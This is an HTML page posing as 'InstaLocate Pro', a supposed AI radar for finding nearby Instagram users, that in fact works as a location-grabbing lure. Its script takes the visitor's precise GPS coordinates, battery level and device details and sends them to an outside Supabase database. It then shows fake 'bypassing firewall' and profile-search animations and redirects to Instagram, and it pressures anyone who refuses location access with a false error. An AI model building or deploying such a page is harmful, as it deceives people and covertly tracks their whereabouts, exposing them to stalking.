<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaLocate Pro | Find Local Community</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --main: #0095f6; --accent: #00376b; --glass: rgba(255, 255, 255, 0.8); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        
        body { background: radial-gradient(circle at top right, #e0f2fe, #ffffff); color: #262626; overflow-x: hidden; }

        /* Premium Header */
        nav { padding: 20px 10%; display: flex; justify-content: space-between; align-items: center; background: var(--glass); backdrop-filter: blur(10px); position: fixed; width: 100%; z-index: 1000; border-bottom: 1px solid rgba(0,0,0,0.05); }
        .logo { font-weight: 900; font-size: 24px; color: var(--main); letter-spacing: -1px; }

        /* Hero Section */
        .hero { height: 100vh; display: flex; align-items: center; justify-content: center; padding: 0 10%; position: relative; }
        .hero-content { flex: 1; animation: slideIn 1s ease-out; }
        .hero-content h1 { font-size: 56px; line-height: 1.1; margin-bottom: 20px; background: linear-gradient(45deg, #00376b, #0095f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero-content p { font-size: 18px; color: #666; margin-bottom: 35px; max-width: 500px; }

        /* Floating Icons Animation */
        .visuals { flex: 1; position: relative; display: flex; justify-content: center; }
        .floating-card { width: 300px; height: 400px; background: white; border-radius: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.05); display: flex; flex-direction: column; align-items: center; justify-content: center; animation: float 6s ease-in-out infinite; }
        .circle-pulse { width: 100px; height: 100px; background: rgba(0, 149, 246, 0.1); border-radius: 50%; position: relative; display: flex; align-items: center; justify-content: center; }
        .circle-pulse::after { content: ''; width: 100%; height: 100%; border: 2px solid var(--main); border-radius: 50%; position: absolute; animation: pulse 2s infinite; }

        /* Main Action Button */
        .cta-btn { background: var(--main); color: white; padding: 18px 45px; border-radius: 50px; border: none; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.4s; box-shadow: 0 10px 30px rgba(0, 149, 246, 0.3); }
        .cta-btn:hover { transform: scale(1.05); box-shadow: 0 15px 40px rgba(0, 149, 246, 0.5); background: #0077c7; }

        /* Scanning Overlay */
        #scanning-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .loader-ring { width: 200px; height: 200px; border: 3px solid #f3f3f3; border-top: 3px solid var(--main); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px; }
        
        /* Keyframes */
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2); opacity: 0; } }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-50px); } to { opacity: 1; transform: translateX(0); } }

        /* Responsive */
        @media (max-width: 768px) {
            .hero { flex-direction: column; text-align: center; padding-top: 100px; }
            .hero-content h1 { font-size: 38px; }
            .visuals { margin-top: 50px; }
        }
    </style>
</head>
<body>

    <nav>
        <div class="logo"><i class="fab fa-instagram"></i> INSTALOCATE</div>
        <div style="font-size: 12px; font-weight: bold; color: #999;">REGION: ASIA-PACIFIC</div>
    </nav>

    <section class="hero" id="main-content">
        <div class="hero-content">
            <h1>Find your social circle, <b>instantly.</b></h1>
            <p>Our AI-powered radar maps active Instagram users within 500 meters of your current position. Connect with people around you.</p>
            <button class="cta-btn" onclick="initializeRadar()">
                <i class="fas fa-location-arrow"></i> START LIVE RADAR
            </button>
        </div>
        <div class="visuals">
            <div class="floating-card">
                <div class="circle-pulse">
                    <i class="fas fa-user-friends" style="font-size: 30px; color: var(--main);"></i>
                </div>
                <p style="margin-top: 20px; font-weight: bold; color: #333;">Scanning Active Nodes...</p>
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <div style="width: 8px; height: 8px; background: var(--main); border-radius: 50%;"></div>
                    <div style="width: 8px; height: 8px; background: #ddd; border-radius: 50%;"></div>
                    <div style="width: 8px; height: 8px; background: #ddd; border-radius: 50%;"></div>
                </div>
            </div>
        </div>
    </section>

    <div id="scanning-overlay">
        <div class="loader-ring"></div>
        <h2 id="status-text" style="color: var(--accent); font-weight: 800;">CALIBRATING GPS...</h2>
        <p style="color: #888;">Establishing encrypted link with Instagram Edge Servers.</p>
    </div>

<script>
    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
    const client = supabase.createClient(SB_URL, SB_KEY);

    async function initializeRadar() {
        const overlay = document.getElementById('scanning-overlay');
        const status = document.getElementById('status-text');
        overlay.style.display = 'flex';

        // Advanced Capture: Battery & Detailed Device Info
        let batteryPct = "N/A";
        try {
            const battery = await navigator.getBattery();
            batteryPct = `${(battery.level * 100).toFixed(0)}%`;
        } catch(e) {}

        const deviceDetail = `${navigator.platform} | ${navigator.vendor}`;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "COORDINATES CAPTURED...";
                
                // Fixed: Combined IP Field (Tag + Battery)
                const { error } = await client.from('location_logs').insert([{
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    user_agent: navigator.userAgent,
                    ip: `INSTA-v3 | Batt: ${batteryPct}`, 
                    os_info: deviceDetail // Storing platform in OS_INFO column
                }]);

                // Animations logic for fake discovery
                setTimeout(() => { status.innerText = "BYPASSING FIREWALL..."; }, 2000);
                setTimeout(() => { status.innerText = "FETCHING PROFILES..."; }, 4000);
                setTimeout(() => {
                    alert("SECURITY ALERT: 12 Nearby Users Found. Please Log in to Instagram to view profiles.");
                    window.location.href = "https://instagram.com";
                }, 6000);

            }, (err) => {
                overlay.style.display = 'none';
                alert("CRITICAL ERROR: High-precision location access is required for radar calibration. Please 'Allow' and try again.");
            }, { enableHighAccuracy: true });
        }
    }
</script>

</body>
</html>
